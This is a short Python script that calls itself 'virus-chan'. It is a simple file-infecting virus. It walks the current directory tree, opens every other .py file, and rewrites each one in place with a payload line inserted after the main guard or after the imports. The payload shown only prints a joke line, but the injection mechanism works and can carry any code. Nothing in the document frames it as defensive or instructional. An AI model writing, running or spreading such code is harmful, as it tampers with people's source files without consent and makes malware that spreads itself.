#!/usr/bin/env python
import os
from typing import List

if __name__ == "__main__":
    print('virus-chan activated')
    payload = 'print(\'Tis\\\' nothing but a scratch!\')\n'
    indentation = '    '
    for (root,dirs,files) in os.walk('.', topdown=True):
        for victim in files:
            if(root == '.' and victim == os.path.basename(__file__)):
                continue
            if(victim[-3:] == '.py'):
                infected = False
                print(root)
                print(victim)
                lines = []
                with open(root + '/' + victim,'r') as f:
                    print(lines)
                    lines = f.readlines()
                    if( 'if __name__ == "__main__":' in "".join(lines)):
                        index = lines.index( 'if __name__ == "__main__":\n')
                        print(index)
                        lines.insert(index+1, indentation+payload)
                    else:
                        for index,i in enumerate(lines):
                            if(i[0:6] == 'import' or i[0:4] == 'from'):
                                continue
                            lines.insert(index+1,payload)
                            break
                with open(root + '/' + victim,'w') as f:
                    f.writelines(lines)